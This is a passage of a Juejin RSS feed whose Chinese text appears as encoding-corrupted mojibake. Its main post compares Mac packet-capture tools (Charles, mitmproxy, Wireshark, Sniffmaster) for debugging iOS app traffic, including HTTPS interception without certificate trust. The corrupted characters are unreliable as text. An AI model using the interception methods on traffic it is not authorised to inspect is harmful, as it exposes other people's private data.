<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Fblob%2Fmaster%2Fpackages%2Fcore-js-compat" target="_blank" title="https://github.com/zloirock/core-js/blob/master/packages/core-js-compat" ref="nofollow noopener noreferrer">github.com/zloirock/coâ€¦</a></li>
<li>Github core-js-builder<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Ftree%2Fmaster%2Fpackages%2Fcore-js-builder" target="_blank" title="https://github.com/zloirock/core-js/tree/master/packages/core-js-builder" ref="nofollow noopener noreferrer">github.com/zloirock/coâ€¦</a></li>
<li>So, what's next?<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Fblob%2Fmaster%2Fdocs%2F2023-02-14-so-whats-next.md" target="_blank" title="https://github.com/zloirock/core-js/blob/master/docs/2023-02-14-so-whats-next.md" ref="nofollow noopener noreferrer">github.com/zloirock/coâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Mac æŠ“åŒ…è½¯ä»¶æœ‰å“ªäº›ï¼ŸCharlesã€mitmproxyã€Wiresharkå’ŒSniffmasterå“ªä¸ªæ›´åˆé€‚]]></title>    <link>https://juejin.cn/post/7597452210646302720</link>    <guid>https://juejin.cn/post/7597452210646302720</guid>    <pubDate>2026-01-21T09:27:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597452210646302720" data-draft-id="7597483279270445071" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Mac æŠ“åŒ…è½¯ä»¶æœ‰å“ªäº›ï¼ŸCharlesã€mitmproxyã€Wiresharkå’ŒSniffmasterå“ªä¸ªæ›´åˆé€‚"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-21T09:27:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€å¿ƒçŒ´çˆ·"/> <meta itemprop="url" content="https://juejin.cn/user/2179705232165364"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Mac æŠ“åŒ…è½¯ä»¶æœ‰å“ªäº›ï¼ŸCharlesã€mitmproxyã€Wiresharkå’ŒSniffmasterå“ªä¸ªæ›´åˆé€‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2179705232165364/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€å¿ƒçŒ´çˆ·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:27:39.000Z" title="Wed Jan 21 2026 09:27:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¦‚æœåªæ˜¯æƒ³â€œçœ‹ä¸€ä¸‹è¯·æ±‚â€ï¼ŒMac ä¸Šçš„é€‰æ‹©å…¶å®å¾ˆå¤šã€‚
ä½†å½“éœ€æ±‚å¼€å§‹å˜å¾—å…·ä½“ï¼Œæ¯”å¦‚è¦æŠ“ iOS Appã€è¦çœ‹ HTTPSã€è¦æ”¹è¯·æ±‚å†…å®¹ï¼Œå·¥å…·ä¹‹é—´çš„å·®å¼‚æ‰çœŸæ­£æ˜¾ç°å‡ºæ¥ã€‚</p>
<p>æˆ‘è‡ªå·±åœ¨ Mac ä¸ŠæŠ“åŒ…ï¼Œå¾€å¾€ä¸æ˜¯ä¸€å¼€å§‹å°±å†³å®šç”¨å“ªä¸ªè½¯ä»¶ï¼Œè€Œæ˜¯å…ˆæƒ³æ¸…æ¥šå‡ ä¸ªé—®é¢˜ï¼š
æ˜¯æŠ“æµè§ˆå™¨æµé‡ï¼Œè¿˜æ˜¯æŠ“æœ¬æœºç¨‹åºï¼Ÿ
æ˜¯è°ƒæ¥å£ï¼Œè¿˜æ˜¯åˆ†æå¼‚å¸¸ï¼Ÿ
æœ‰æ²¡æœ‰ iOS è®¾å¤‡å‚ä¸ï¼Ÿ</p>
<p>è¿™äº›é—®é¢˜ï¼Œç›´æ¥å†³å®šäº†å·¥å…·æ˜¯å¦åˆé€‚ã€‚</p>
<hr/>
<h2 data-id="heading-0"><strong>Charlesï¼šæœ€å®¹æ˜“ä¸Šæ‰‹ï¼Œä½†ä¹Ÿæœ€å®¹æ˜“å¡ä½</strong></h2>
<p>åœ¨ Mac ä¸Šï¼ŒCharles å¾€å¾€æ˜¯å¾ˆå¤šäººçš„ç¬¬ä¸€ç«™ã€‚</p>
<p>å¦‚æœåªæ˜¯æŠ“æµè§ˆå™¨æˆ–è€…æ™®é€š Appï¼š</p>
<ul>
<li>å®‰è£…åå¯åŠ¨</li>
<li>æ‰“å¼€ macOS çš„ç½‘ç»œä»£ç†</li>
<li>è®¿é—®ç›®æ ‡é¡µé¢</li>
</ul>
<p>HTTP è¯·æ±‚å‡ ä¹ç«‹åˆ»å°±èƒ½çœ‹åˆ°ã€‚</p>
<p>ä½†ä¸€æ—¦æ¶‰åŠ HTTPSï¼Œæˆ–è€…æŠ“ iOS Appï¼Œæ­¥éª¤å°±ä¼šæ˜æ˜¾å˜å¤šï¼š</p>
<ul>
<li>å®‰è£… Charles æ ¹è¯ä¹¦</li>
<li>åœ¨ macOS é’¥åŒ™ä¸²é‡Œè®¾ä¸ºä¿¡ä»»</li>
<li>iOS è®¾å¤‡ä¸Šå†è£…ä¸€ä»½è¯ä¹¦</li>
<li>Wi-Fi ä»£ç†æ‰‹åŠ¨é…ç½®</li>
</ul>
<p>åªè¦å…¶ä¸­ä¸€æ­¥æ²¡åšå¯¹ï¼Œè¡¨ç°é€šå¸¸å°±æ˜¯â€œä»€ä¹ˆéƒ½æŠ“ä¸åˆ°â€ã€‚
è¿™ä¸æ˜¯ Charles çš„é—®é¢˜ï¼Œè€Œæ˜¯ä»£ç†æ¨¡å¼æœ¬èº«çš„å¤æ‚åº¦å†³å®šçš„ã€‚</p>
<hr/>
<h2 data-id="heading-1"><strong>mitmproxyï¼šæ›´åå‘å¼€å‘è€…çš„å‘½ä»¤è¡Œæ–¹æ¡ˆ</strong></h2>
<p>å¦‚æœä½ æ›´ä¹ æƒ¯ç»ˆç«¯ç¯å¢ƒï¼Œmitmproxy æ˜¯ Mac ä¸Šéå¸¸å€¼å¾—ä¸€è¯•çš„å·¥å…·ã€‚</p>
<p>å®ƒçš„ä¼˜åŠ¿åœ¨äºï¼š</p>
<ul>
<li>å¯è„šæœ¬åŒ–</li>
<li>è¯·æ±‚å’Œå“åº”å¯ä»¥ç”¨ Python ç›´æ¥å¤„ç†</li>
<li>é€‚åˆè‡ªåŠ¨åŒ–è°ƒè¯•æˆ–æµ‹è¯•åœºæ™¯</li>
</ul>
<p>ä½†ç°å®æ˜¯ï¼Œmitmproxy å¯¹æ–°æ‰‹å¹¶ä¸å‹å¥½ã€‚
è¯ä¹¦ã€ä»£ç†ã€è„šæœ¬ä¸‰ä»¶äº‹ï¼Œåªè¦æœ‰ä¸€é¡¹ä¸ç†Ÿï¼Œä½“éªŒå°±ä¼šæ˜æ˜¾ä¸‹é™ã€‚</p>
<p>æˆ‘ä¸€èˆ¬åªåœ¨éœ€è¦â€œæ‰¹é‡å¤„ç†è¯·æ±‚é€»è¾‘â€æ—¶æ‰ä¼šé€‰å®ƒï¼Œè€Œä¸æ˜¯æ—¥å¸¸æŠ“åŒ…ã€‚</p>
<hr/>
<h2 data-id="heading-2"><strong>Wiresharkï¼šä¸æ˜¯æ›¿ä»£å“ï¼Œè€Œæ˜¯è¡¥å……</strong></h2>
<p>ä¸¥æ ¼æ¥è¯´ï¼ŒWireshark å¹¶ä¸æ˜¯æŠ“â€œHTTP æ¥å£â€çš„å·¥å…·ã€‚</p>
<p>åœ¨ Mac ä¸Šç”¨ Wiresharkï¼Œæ›´åƒæ˜¯åœ¨çœ‹ï¼š</p>
<ul>
<li>TCP / UDP è¿æ¥</li>
<li>DNS è¯·æ±‚</li>
<li>TLS æ¡æ‰‹æ˜¯å¦æˆåŠŸ</li>
</ul>
<p>å®ƒéå¸¸é€‚åˆå›ç­”ä¸€äº›ä»£ç†å·¥å…·å›ç­”ä¸äº†çš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼š</p>
<blockquote>
<p>è¯·æ±‚æœ‰æ²¡æœ‰çœŸæ­£å‘å‡ºå»ï¼Ÿ
æ˜¯ DNS å¤±è´¥ï¼Œè¿˜æ˜¯ TCP è¢«æ‹’ç»ï¼Ÿ</p>
</blockquote>
<p>ä½†å¦‚æœä½ æƒ³ç›´æ¥çœ‹ HTTPS å†…å®¹ï¼ŒWireshark å¹¶ä¸åˆé€‚ï¼Œé™¤éä½ å·²ç»èƒ½è§£å¯† TLSã€‚</p>
<hr/>
<h2 data-id="heading-3"><strong>å½“æŠ“åŒ…å¯¹è±¡å˜æˆ iOS è®¾å¤‡ï¼Œå·¥å…·é€‰æ‹©ä¼šæ˜æ˜¾æ”¶ç¼©</strong></h2>
<p>ä¸€æ—¦éœ€æ±‚å˜æˆï¼š</p>
<ul>
<li>Mac + iPhone</li>
<li>æŠ“ App å†…è¯·æ±‚</li>
<li>HTTPS æ˜¯é»˜è®¤</li>
</ul>
<p>å¾ˆå¤š Mac æŠ“åŒ…è½¯ä»¶å°±å¼€å§‹æ˜¾å¾—åŠ›ä¸ä»å¿ƒã€‚</p>
<p>ä»£ç†æ¨¡å¼å¯ä»¥ç»§ç»­ç”¨ï¼Œä½†é…ç½®æˆæœ¬ä¼šè¿…é€Ÿä¸Šå‡ï¼Œå°¤å…¶æ˜¯é¢å¯¹è¯ä¹¦æ ¡éªŒã€åŒå‘éªŒè¯æ—¶ã€‚</p>
<hr/>
<h2 data-id="heading-4"><strong>æŠ“åŒ…å¤§å¸ˆåœ¨ Mac ä¸Šçš„å®šä½ï¼Œå…¶å®å¾ˆæ¸…æ™°</strong></h2>
<p>æˆ‘ç¬¬ä¸€æ¬¡åœ¨ Mac ä¸Šç”¨ <strong>æŠ“åŒ…å¤§å¸ˆ</strong>ï¼Œå¹¶ä¸æ˜¯ä¸ºäº†æ›¿ä»£ Charlesï¼Œè€Œæ˜¯å› ä¸ºä»£ç†æ¨¡å¼å·²ç»èµ°ä¸é€šã€‚</p>
<p>åœ¨ Mac ç¯å¢ƒä¸‹ï¼ŒæŠ“åŒ…å¤§å¸ˆæ›´åƒæ˜¯ä¸€ä¸ªåº•å±‚æŠ“åŒ…å·¥å…·ï¼Œå°¤å…¶æ˜¯åœ¨æŠ“ iOS è®¾å¤‡æ—¶ã€‚</p>
<p>å®ƒåœ¨ Mac ä¸Šå¸¸ç”¨çš„å‡ ç§åŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li>HTTPS ä»£ç†æŠ“åŒ…ï¼ˆä¼ ç»Ÿæ–¹å¼ï¼‰</li>
<li>HTTPS æš´åŠ›æŠ“åŒ…ï¼ˆæ— éœ€è¯ä¹¦ä¿¡ä»»ï¼‰</li>
<li>æ•°æ®æµæŠ“åŒ…ï¼ˆæŸ¥çœ‹æ‰€æœ‰ç½‘ç»œæ•°æ®ï¼‰</li>
</ul>
<p>è¿™äº›åŠŸèƒ½è§£å†³çš„æ˜¯ä¸åŒå±‚çº§çš„é—®é¢˜ï¼Œè€Œä¸æ˜¯äº’ç›¸æ›¿ä»£ã€‚</p>
<hr/>
<h2 data-id="heading-5"><strong>å¦‚ä½•åœ¨ Mac ä¸Šç”¨æŠ“åŒ…å¤§å¸ˆæŠ“ iOS App</strong></h2>
<p>å¦‚æœç›®æ ‡æ˜¯ iPhone Appï¼š</p>
<ul>
<li>ç”¨ USB è¿æ¥ iPhone åˆ° Mac</li>
<li>ä¿æŒè®¾å¤‡è§£é”å¹¶ä¿¡ä»»ç”µè„‘</li>
<li>æŒ‰æç¤ºå®‰è£…æè¿°æ–‡ä»¶</li>
<li>é€‰æ‹© iOS è®¾å¤‡è€Œä¸æ˜¯â€œæœ¬æœºâ€</li>
<li>æ ¹æ®éœ€æ±‚è¿›å…¥ HTTPS ä»£ç†æŠ“åŒ…æˆ– HTTPS æš´åŠ›æŠ“åŒ…</li>
</ul>
<p>å¦‚æœåªæ˜¯æ¥å£è°ƒè¯•ï¼Œæˆ‘ä¼šå…ˆè¯•ä»£ç†æ¨¡å¼ï¼›
å¦‚æœä»£ç†æŠ“ä¸åˆ°ï¼Œå†åˆ‡æ¢æš´åŠ›æŠ“åŒ…ã€‚</p>
<p>è¿™ç§æŒ‰æˆæœ¬é€’å¢çš„æ–¹å¼ï¼Œæ¯”ä¸€ä¸Šæ¥å°±æå¤æ‚æ–¹æ¡ˆè¦çœæ—¶é—´ã€‚</p>
<hr/>
<h2 data-id="heading-6"><strong>æœ¬æœºæŠ“åŒ…ä¸è®¾å¤‡æŠ“åŒ…ï¼Œæ˜¯ä¸¤æ¡å®Œå…¨ä¸åŒçš„è·¯</strong></h2>
<p>åœ¨ Mac ä¸ŠæŠ“åŒ…ï¼Œç»å¸¸ä¼šæ··æ·†ä¸¤ä¸ªæ¦‚å¿µï¼š</p>
<ul>
<li>æŠ“ Mac æœ¬æœºæµé‡</li>
<li>æŠ“ iOS è®¾å¤‡æµé‡</li>
</ul>
<p>å‰è€…æ›´é€‚åˆç”¨ Charlesã€mitmproxyï¼›
åè€…æ‰æ˜¯æŠ“åŒ…å¤§å¸ˆå‘æŒ¥ä¼˜åŠ¿çš„åœ°æ–¹ã€‚</p>
<p>æŠ“åŒ…å¤§å¸ˆåœ¨ Mac ä¸Šç¬¬ä¸€æ¬¡è¿è¡Œæœ¬æœºæŠ“åŒ…æ—¶ï¼Œä¼šè¦æ±‚è¾“å…¥ç³»ç»Ÿå¯†ç ï¼Œè¿™æ˜¯ macOS æƒé™æ¨¡å‹å†³å®šçš„ï¼Œå±äºæ­£å¸¸è¡Œä¸ºã€‚</p>
<hr/>
<h2 data-id="heading-7"><strong>å·¥å…·å¤šï¼Œå¹¶ä¸æ„å‘³ç€è¦å…¨ç”¨</strong></h2>
<p>å®é™…å·¥ä½œä¸­ï¼Œæˆ‘å¾ˆå°‘åªç”¨ä¸€ä¸ªæŠ“åŒ…å·¥å…·ï¼š</p>
<ul>
<li>Charlesï¼šå¿«é€Ÿçœ‹æ¥å£</li>
<li>Wiresharkï¼šæ’æŸ¥è¿æ¥é—®é¢˜</li>
<li>æŠ“åŒ…å¤§å¸ˆï¼šå¤„ç† iOSã€è¯ä¹¦æ ¡éªŒã€å¤æ‚ HTTPS</li>
</ul>
<p>å®ƒä»¬ä¹‹é—´ä¸æ˜¯ç«äº‰å…³ç³»ï¼Œè€Œæ˜¯è¦†ç›–ä¸åŒé—®é¢˜ç©ºé—´ã€‚</p>
<hr/>
<p>Mac æŠ“åŒ…è½¯ä»¶ç¡®å®ä¸å°‘ï¼Œä½†çœŸæ­£å¥½ç”¨çš„ï¼Œå¾€å¾€å–å†³äºåœºæ™¯è€Œä¸æ˜¯åŠŸèƒ½åˆ—è¡¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è·¨å¹³å°å¼€å‘åœ°å›¾ï¼š2025è·¨å¹³å°æŠ€æœ¯ç®€å•æ€»ç»“ | 2026å¹´1æœˆ]]></title>    <link>https://juejin.cn/post/7597642574933508105</link>    <guid>https://juejin.cn/post/7597642574933508105</guid>    <pubDate>2026-01-21T09:36:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597642574933508105" data-draft-id="7597623392456065075" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è·¨å¹³å°å¼€å‘åœ°å›¾ï¼š2025è·¨å¹³å°æŠ€æœ¯ç®€å•æ€»ç»“ | 2026å¹´1æœˆ"/> <meta itemprop="keywords" content="Flutter,å®¢æˆ·ç«¯"/> <meta itemprop="datePublished" content="2026-01-21T09:36:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜è€åˆ˜"/> <meta itemprop="url" content="https://juejin.cn/user/662360127965769"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è·¨å¹³å°å¼€å‘åœ°å›¾ï¼š2025è·¨å¹³å°æŠ€æœ¯ç®€å•æ€»ç»“ | 2026å¹´1æœˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/662360127965769/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜è€åˆ˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:36:04.000Z" title="Wed Jan 21 2026 09:36:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>å“ˆå–½ï¼Œæˆ‘æ˜¯è€åˆ˜</strong></p>
<p>2025å¹´å·²æˆè¿‡å¾€ã€‚éšç€iOSã€Androidã€æ¡Œé¢ç«¯ã€Webä¸å„ç±»å°ç¨‹åºçš„æŒç»­å‘å±•ï¼ŒåŸç”Ÿå¼€å‘çš„é«˜å¢™å·²éš¾ä»¥ç»´ç³»ï¼Œæˆæœ¬ä¸æ•ˆç‡çš„çŸ›ç›¾è¾¾åˆ°é¡¶å³°ã€‚</p>
